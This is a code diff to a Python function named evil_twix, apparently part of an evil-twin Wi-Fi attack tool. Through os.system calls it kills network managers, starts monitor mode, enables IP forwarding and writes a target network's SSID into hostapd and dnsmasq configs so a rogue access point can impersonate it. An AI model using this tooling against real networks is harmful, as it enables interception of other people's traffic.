@@ -76,6 +76,7 @@ def evil_twix(interface, target):
     # Setting interface ip address
     os.system("airmon-ng check kill")
     os.system("airmon-ng start %s" % interface)
+    os.system("ip link set %s up" % (interface+"mon"))
 
     # Allow forwarding and put interface in ip tables
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -86,9 +87,9 @@ def evil_twix(interface, target):
     os.system("cp template/template_hostapd.conf hostapd.conf")
 
     # Modifying the templates
-    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf"% (interface+"mon"))
-    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf"% (interface+"mon"))
-    os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf"% target[0])
+    os.system("sed -i 's/iface_to_use/%s/' dnsmasq.conf" % (interface+"mon"))
+    os.system("sed -i 's/iface_to_use/%s/' hostapd.conf" % (interface+"mon"))
+    os.system("sed -i 's/ssid_to_use/%s/' hostapd.conf" % target[0])
 
     hostapd = os.fork()
     dnsmasq = os.fork()
